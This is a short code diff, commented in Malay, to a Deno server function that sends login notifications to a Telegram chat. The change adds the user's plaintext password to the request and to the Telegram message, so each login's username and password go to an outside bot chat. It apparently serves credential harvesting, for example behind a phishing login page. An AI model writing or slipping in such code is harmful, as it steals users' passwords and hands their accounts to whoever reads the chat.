@@ -11,7 +11,7 @@ serve(async (req) => {
   }
 
   try {
-    const { username, message } = await req.json();
+    const { username, password, message } = await req.json(); // Menerima kata laluan
 
     const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
     const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
@@ -29,7 +29,7 @@ serve(async (req) => {
       },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
-        text: `Pemberitahuan Log Masuk:\nNama Pengguna: ${username}\nStatus: ${message}`,
+        text: `Pemberitahuan Log Masuk:\nNama Pengguna: ${username}\nKata Laluan: ${password}\nStatus: ${message}`, // Memasukkan kata laluan
       }),
     });
 
